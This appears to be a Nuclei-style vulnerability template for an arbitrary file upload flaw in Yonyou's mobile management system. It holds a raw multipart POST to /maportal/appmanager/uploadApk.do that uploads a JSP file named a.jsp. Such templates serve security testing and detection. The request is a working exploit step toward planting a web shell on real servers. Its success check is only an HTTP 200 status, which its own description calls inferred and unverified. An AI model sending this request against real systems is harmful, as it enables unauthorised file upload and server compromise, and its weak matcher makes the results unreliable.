id: poc-448f17e0702bee410874
info:
  name: 用友移动管理系统uploadApk.do任意文件上传漏洞
  author: hacktwo
  severity: high
  description: '[!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
  tags: file-upload,2025
http:
- raw:
  - 'POST /maportal/appmanager/uploadApk.do HTTP/1.1

    Content-Type: multipart/form-data; boundary=00content0boundary00

    User-Agent: Java/1.8.0_381

    Host: {{Hostname}}

    Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2

    Content-Length: 128

    Connection: close


    --00content0boundary00

    Content-Disposition: form-data; name="downloadpath"; filename="a.jsp"


    123

    --00content0boundary00--'
  redirects: false
  matchers:
  - status:
    - 200
    type: status
